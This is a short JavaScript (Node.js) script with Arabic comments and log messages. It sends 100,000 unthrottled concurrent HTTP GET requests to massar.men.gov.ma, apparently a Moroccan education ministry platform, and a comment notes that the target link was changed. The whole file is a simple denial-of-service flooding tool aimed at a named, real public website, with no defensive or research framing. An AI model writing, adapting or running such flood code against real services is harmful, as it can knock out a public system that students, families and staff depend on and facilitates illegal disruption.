const axios = require('axios');

async function sendRequests() {
  const url = 'https://massar.men.gov.ma'; // تم تغيير الرابط هنا
  const requestsCount = 100000;

  console.log('بدء إرسال الطلبات...');

  for (let i = 0; i < requestsCount; i++) {
    axios.get(url)
      .then(() => {
        console.log(`تم إرسال الطلب رقم ${i + 1}`);
      })
      .catch((error) => {
        console.error(`حدث خطأ أثناء إرسال الطلب رقم ${i + 1}: ${error}`);
      });
  }
}

sendRequests();
